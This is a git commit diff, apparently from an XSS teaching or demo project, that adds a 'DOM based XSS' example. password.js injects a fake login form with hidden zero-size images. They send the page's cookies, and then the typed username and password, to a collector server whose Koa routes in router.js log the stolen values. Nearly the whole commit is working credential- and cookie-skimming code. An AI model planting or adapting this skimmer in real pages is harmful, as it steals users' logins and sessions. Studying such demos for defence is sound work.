da300e72eb63171c4306174e2f7a31b7196328e7
brick9527 <brick9527@foxmail.com>
2021-10-13 23:40:58 +0800

    feat: 添加DOM based XSS

--- public-server/libs/router.js
+++ public-server/libs/router.js
@@ -1,13 +1,18 @@
 const Router = require('@koa/router');
 
 const router = new Router();
-router.post('/api/password', (ctx, next) => {
+router.post('/api/cookie', (ctx, next) => {
   console.log(ctx.body);
   ctx.body = 'ok';
 });
 
-router.get('/api/password', (ctx, next) => {
-  console.log(ctx.body, ctx.query);
+router.get('/api/cookie', (ctx, next) => {
+  console.log(`获取用户cookie数据: ${JSON.stringify(ctx.query)}`);
+  ctx.body = 'ok';
+});
+
+router.get('/api/password', ctx => {
+  console.log(`获取用户表单数据: ${JSON.stringify(ctx.query)}`);
   ctx.body = 'ok';
 });
 
--- public-server/public/password.js
+++ public-server/public/password.js
@@ -17,10 +17,10 @@ window.onload = function() {
   console.log(document.cookie);
   var formContainerOBJ = document.getElementById('form-container');
   formContainerOBJ.innerHTML = '<form id="form">' +
-    '<p>用户名:</p><input type="text"><br/>' +
-    '<p>密码:</p><input type="password"><br>' +
-    '<img src="http://127.0.0.1:3002/api/password?' + document.cookie + '" style="visibility:hidden;width:0;height:0">' +
-    '<button id="submit-btn">提交</button>' +
+    '<p>用户名:</p><input type="text" id="username-input"><br/>' +
+    '<p>密码:</p><input type="password" id="password-input"><br>' +
+    '<img src="http://127.0.0.1:3002/api/cookie?' + document.cookie + '" style="visibility:hidden;width:0;height:0">' +
+    '<button type="button" id="submit-btn">提交</button>' +
   '</form>'
 
   var submmitBtn = document.getElementById('submit-btn');
@@ -29,6 +29,16 @@ window.onload = function() {
     var event = e || window.event;
     event.preventDefault();
     window.event.returnValue = false; // 兼容IE6~8
+    // 添加一个img,并带有对应src
+    var form = document.getElementById('form');
+    var username = document.getElementById('username-input').value;
+    var password = document.getElementById('password-input').value;
+    var img = document.createElement('img');
+    img.src='http://127.0.0.1:3002/api/password?username=' + username + '&password=' + password;
+    img.style = 'visibility:hidden;width:0;height:0';
+    form.appendChild(img);
+    
   });
+
 }
 
